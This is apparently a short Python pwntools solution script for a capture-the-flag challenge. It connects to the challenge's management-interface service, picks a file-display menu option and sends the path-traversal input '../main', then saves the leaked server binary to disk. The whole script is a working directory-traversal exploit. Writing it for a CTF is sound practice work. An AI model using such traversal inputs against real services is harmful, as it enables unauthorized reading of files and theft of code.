from pwn import * 
import sys

def main() :
    HOST = "mngmnt-iface.ctfcompetition.com"
    PORT = "1337"
    conn = remote(HOST, PORT)

    conn.readuntil("3) Quit")

    conn.sendline("2")
    conn.readuntil("shown?")

    conn.sendline("../main")

    main_binary = conn.readuntil("3) Quit") 
    conn.sendline("3")
    print(sys.getsizeof(main_binary))

    with open("./main", "wb") as f :
        f.write(main_binary)

    return 0

main()
